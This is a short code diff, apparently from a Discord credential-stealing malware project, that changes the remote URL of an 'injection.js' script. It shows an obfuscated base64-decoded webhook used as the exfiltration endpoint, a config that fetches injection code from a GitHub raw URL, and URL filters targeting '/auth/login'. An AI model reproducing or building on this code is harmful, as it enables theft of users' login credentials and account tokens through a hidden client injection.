@@ -15,7 +15,7 @@ const webhook = Buffer.from(encodedWebhook, 'base64').toString('utf-8');
 
 const CONFIG = {
     webhook: webhook,
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/code-breaker00/injection/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
